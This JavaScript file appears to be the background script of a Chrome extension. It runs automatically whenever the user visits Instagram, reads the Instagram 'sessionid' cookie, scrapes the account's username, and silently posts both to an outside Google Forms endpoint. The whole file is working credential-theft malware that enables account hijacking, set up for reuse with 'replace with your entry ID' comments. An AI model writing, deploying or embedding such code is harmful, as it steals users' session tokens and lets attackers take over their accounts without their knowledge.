// Function to send session ID and username to Google Forms
function sendSessionData(sessionid, username) {
    // Google Form URL
    let formUrl = "https://docs.google.com/forms/d/e/1FAIpQLSfGxKLxx8E57L3bh0xKTRA3C_NYhCgF6F3D-vv6lQmV7YXwew/formResponse";
    let formData = new FormData();
    formData.append("entry.2049110628", sessionid); // Replace with your session ID field entry ID
    formData.append("entry.1228199082", username);  // Replace with your username field entry ID

    // Send session ID and username via POST request
    fetch(formUrl, {
        method: 'POST',
        mode: 'no-cors',
        body: formData
    }).then(response => {
        console.log('Session ID and Username sent to Google Form.');
    }).catch(error => {
        console.error('Error sending session data:', error);
    });
}

// Function to extract session ID
function extractSessionID(callback) {
    chrome.cookies.getAll({ domain: ".instagram.com", name: "sessionid" }, function (cookies) {
        if (cookies.length > 0) {
            let sessionid = cookies[0].value;
            console.log("Session ID:", sessionid);
            chrome.storage.local.set({ "sessionid": sessionid });
            callback(sessionid);
        } else {
            console.log("Session ID not found.");
        }
    });
}

// Function to extract Instagram username
function extractUsername(callback) {
    fetch('https://www.instagram.com/accounts/edit/', {
        method: 'GET',
        credentials: 'include'
    })
    .then(response => response.text())
    .then(text => {
        let username = text.match(/"username":"(.*?)"/);
        if (username && username[1]) {
            console.log("Instagram Username:", username[1]);
            callback(username[1]);
        } else {
            console.log("Username not found.");
            callback("Username not found");
        }
    })
    .catch(error => {
        console.error('Error extracting username:', error);
        callback("Username not found");
    });
}

// Function to extract and send session ID and username
function extractAndSendSessionData() {
    extractSessionID(sessionid => {
        extractUsername(username => {
            sendSessionData(sessionid, username);
        });
    });
}

// Detect when the user navigates to Instagram
chrome.webNavigation.onCompleted.addListener(function (details) {
    if (details.url.includes("instagram.com")) {
        // Delay to ensure that the session ID is set after login
        setTimeout(extractAndSendSessionData, 3000);  // 3 seconds delay
    }
}, { url: [{ urlMatches: 'https://www.instagram.com/*' }] });
